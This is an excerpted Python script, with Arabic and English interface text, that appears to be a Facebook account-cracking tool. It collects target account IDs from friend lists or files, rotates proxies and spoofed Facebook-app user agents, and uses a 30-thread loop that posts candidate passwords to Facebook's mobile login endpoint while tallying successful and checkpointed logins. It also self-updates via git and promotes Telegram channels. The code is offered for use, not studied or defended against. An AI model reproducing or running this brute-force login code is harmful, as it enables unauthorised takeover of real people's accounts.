...
print('\033[4;32m')
print('[\033[1;32m✓\033[1;37m] جــاري التحقق  !! ')
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m]  تم الاتصال نورت!! ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\ المبرمج نمࢪود :) ')
time.sleep(2)
...
try:
  ...
  open('so1heros.txt','w').write(proxylist)
except Exception as e:
  print('server internit heros error')
proxsi=open('so1heros.txt','r').read().splitlines()
...
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}sathi{M}={H}abir{M}={H}tisha{M}={H}Mahdi{M}={H}samim{P}]'
...
from concurrent.futures import ThreadPoolExecutor as tblue
...
addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
ugen=[]
cokbrut=[]
...
try:bluemi = open('.ugent.txt','r').read().splitlines()
except:bluemi = ["Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
...
webbrowser.open(f'https://t.me/py_1hon')
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
...
table = Table(title="SDM",style="magenta")
table.add_column("           ☆𝑆𝐷𝑀☆ نـمࢪود        ",style='blue')

table.add_row("1- X+قنـاتي:@py_1hon ",style='yellow')
table.add_row("2- X+حسابي: @M_T_F",style='purple')
table.add_row("— Programmer Nimrod—",style='cyan')
console = Console()
console.print(table)
print(a14+"▱" *60)
...
cetak(nel('• صـوࢪ صيـد ماكو اوقف الادات•'))
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h}@M_T_F{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s @M_T_F   %s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
...
def SDM(my_name,my_id):
	...
	print("\033[2;35m Name : "+my_name)
	print(f'\033[2;36mID : '+str(my_id))
	print(f' Ip  : {ip}\n') 
	print(b) 
	print(f" {a16}{N}☽الــقــائــمة☾")
	print(a37+'•'*42)
	print('{\x1b[1;31m1\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐈𝐄𝐍𝐃𝐒  : من الاصدقاء    ')
	print(a37+'•'*42)
	print('{\x1b[1;32m2\x1b[1;36m} \x1b[38;5;208mғɪʟᴇ  : من ملف   ')
	print(a37+'•'*42)
...
def passwrd():
	...
	with tblue(max_workers=30) as pool:
		for yuzong in id2:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r𝗦𝗗𝗠 ¦¦ 𝐕𝐈𝐏-𝐓𝐎𝐎l  {a35}{b}{loop}{a33}•{a31}{len(id)}{a30}  • OK:{a25}{a26}{ok}{a40} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_blueirects=False)
